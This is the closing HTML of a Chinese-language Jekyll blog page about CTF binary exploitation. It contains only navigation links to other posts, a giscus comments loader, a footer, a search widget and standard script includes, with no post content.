              <!-- Recommend the other 3 posts according to the tags and categories of the current post. -->

<!-- The total size of related posts -->


<!-- An random integer that bigger than 0 -->


<!-- Equals to TAG_SCORE / {max_categories_hierarchy} -->

























            
              
              <!-- Navigation buttons at the bottom of the post. -->

<nav class="post-navigation d-flex justify-content-between" aria-label="Post Navigation">
  
  

  
    <a
      href="/posts/PHP-So-Pwn/"
      class="btn btn-outline-primary"
      aria-label="上一篇"
    >
      <p>2024-05-31-PHP-So-Pwn</p>
    </a>
  

  
    <a
      href="/posts/IrisCTF2025-Pwn-Binary-Exploitation-WriteUps/"
      class="btn btn-outline-primary"
      aria-label="下一篇"
    >
      <p>IrisCTF2025-Pwn-Binary-Exploitation-WriteUps</p>
    </a>
  
</nav>

            
              
              <!--  The comments switcher -->

  
  <!-- https://giscus.app/ -->
<script type="text/javascript">
  (function () {
    const origin = 'https://giscus.app';
    const iframe = 'iframe.giscus-frame';
    const lightTheme = 'light';
    const darkTheme = 'dark_dimmed';

    let initTheme = lightTheme;
    const html = document.documentElement;

    if (
      (html.hasAttribute('data-mode') &&
        html.getAttribute('data-mode') === 'dark') ||
      (!html.hasAttribute('data-mode') &&
        window.matchMedia('(prefers-color-scheme: dark)').matches)
    ) {
      initTheme = darkTheme;
    }

    let giscusAttributes = {
      src: 'https://giscus.app/client.js',
      'data-repo': 'imLZH1/me_giscus_Discussions-',
      'data-repo-id': 'comments',
      'data-category': 'general',
      'data-category-id': '',
      'data-mapping': 'pathname',
      'data-reactions-enabled': '1',
      'data-emit-metadata': '0',
      'data-theme': initTheme,
      'data-input-position': 'bottom',
      'data-lang': 'zh-CN',
      'data-loading': 'lazy',
      crossorigin: 'anonymous',
      async: ''
    };

    let giscusScript = document.createElement('script');
    Object.entries(giscusAttributes).forEach(([key, value]) =>
      giscusScript.setAttribute(key, value)
    );
    document.getElementById('tail-wrapper').appendChild(giscusScript);

    addEventListener('message', (event) => {
      if (
        event.source === window &&
        event.data &&
        event.data.direction === ModeToggle.ID
      ) {
        /* global theme mode changed */
        const mode = event.data.message;
        const theme = mode === ModeToggle.DARK_MODE ? darkTheme : lightTheme;

        const message = {
          setConfig: {
            theme: theme
          }
        };

        const giscus = document.querySelector(iframe).contentWindow;
        giscus.postMessage({ giscus: message }, origin);
      }
    });
  })();
</script>



            

            <!-- The Footer -->

<footer
  aria-label="Site Info"
  class="
    d-flex flex-column justify-content-center text-muted
    flex-lg-row justify-content-lg-between align-items-lg-center pb-lg-3
  "
>
  <p>
    ©
    <time>2025</time>
    <a href="https://user.qzone.qq.com/3461665835">imLZH1</a>.
    
      <span
        data-bs-toggle="tooltip"
        data-bs-placement="top"
        title="除非另有说明，本网站上的博客文章均由作者按照知识共享署名 4.0 国际 (CC BY 4.0) 许可协议进行授权。"
      >保留部分权利。</span>
    
  </p>
	<span id="busuanzi_container_site_pv">本站总访问量<span id="busuanzi_value_site_pv"></span>次</span>

  <p>本站采用 <a href="https://jekyllrb.com" target="_blank" rel="noopener">Jekyll</a> 主题 <a href="https://github.com/cotes2020/jekyll-theme-chirpy" target="_blank" rel="noopener">Chirpy</a>
  </p>
</footer>

          </div>
        </div>

        <!-- The Search results -->

<div id="search-result-wrapper" class="d-flex justify-content-center unloaded">
  <div class="col-11 content">
    <div id="search-hints">
      <!-- The trending tags list -->















  
    
    
    
    
      
        
        



  <section>
    <h2 class="panel-heading">热门标签</h2>
    <div class="d-flex flex-wrap mt-3 mb-1 me-3">
      
        
        <a class="post-tag btn btn-outline-primary" href="/tags/ctf/">CTF</a>
      
    </div>
  </section>


    </div>
    <div id="search-results" class="d-flex flex-wrap justify-content-center text-muted mt-3"></div>
  </div>
</div>

      </div>

      <aside aria-label="Scroll to Top">
        <button id="back-to-top" type="button" class="btn btn-lg btn-box-shadow">
          <i class="fas fa-angle-up"></i>
        </button>
      </aside>
    </div>

    <div id="mask"></div>

    
      <aside
  id="notification"
  class="toast"
  role="alert"
  aria-live="assertive"
  aria-atomic="true"
  data-bs-animation="true"
  data-bs-autohide="false"
>
  <div class="toast-header">
    <button
      type="button"
      class="btn-close ms-auto"
      data-bs-dismiss="toast"
      aria-label="Close"
    ></button>
  </div>
  <div class="toast-body text-center pt-0">
    <p class="px-2 mb-3">发现新版本的内容。</p>
    <button type="button" class="btn btn-primary" aria-label="Update">
      更新
    </button>
  </div>
</aside>

    

    <!-- JavaScripts -->

    <!-- JS selector for site. -->

<!-- commons -->



<!-- layout specified -->


  

  
    <!-- image lazy-loading & popup & clipboard -->
    
  















  
    <script src="/assets/lib/jquery/jquery.min.js"></script>
  

  
    <script src="/assets/lib/bootstrap/bootstrap.bundle.min.js"></script>
  

  
    <script src="/assets/lib/simple-jekyll-search/simple-jekyll-search.min.js"></script>
  

  
    <script src="/assets/lib/loading-attribute-polyfill/loading-attribute-polyfill.umd.min.js"></script>
  

  
    <script src="/assets/lib/magnific-popup/jquery.magnific-popup.min.js"></script>
  

  
    <script src="/assets/lib/clipboard/clipboard.min.js"></script>
  

  
    <script src="/assets/lib/dayjs/dayjs.min.js"></script>
  

  
    <script src="/assets/lib/dayjs/locale/en.min.js"></script>
  

  
    <script src="/assets/lib/dayjs/plugin/relativeTime.min.js"></script>
  

  
    <script src="/assets/lib/dayjs/plugin/localizedFormat.min.js"></script>
  

  
    <script src="/assets/lib/tocbot/tocbot.min.js"></script>
  








<script defer src="/assets/js/dist/post.min.js"></script>






    

    <!--
  Jekyll Simple Search loader
  See: <https://github.com/christian-fei/Simple-Jekyll-Search>
-->





<script>
  /* Note: dependent library will be loaded in `js-selector.html` */
  SimpleJekyllSearch({
    searchInput: document.getElementById('search-input'),
    resultsContainer: document.getElementById('search-results'),
    json: '/assets/js/data/search.json',
    searchResultTemplate: '  <article class="px-1 px-sm-2 px-lg-4 px-xl-0">    <header>      <h2><a href="{url}">{title}</a></h2>      <div class="post-meta d-flex flex-column flex-sm-row text-muted mt-1 mb-1">        {categories}        {tags}      </div>    </header>    <p>{snippet}</p>  </article>',
    noResultsText: '<p class="mt-5"></p>',
    templateMiddleware: function(prop, value, template) {
      if (prop === 'categories') {
        if (value === '') {
          return `${value}`;
        } else {
          return `<div class="me-sm-4"><i class="far fa-folder fa-fw"></i>${value}</div>`;
        }
      }

      if (prop === 'tags') {
        if (value === '') {
          return `${value}`;
        } else {
          return `<div><i class="fa fa-tag fa-fw"></i>${value}</div>`;
        }
      }
    }
  });
</script>

  </body>
</html>

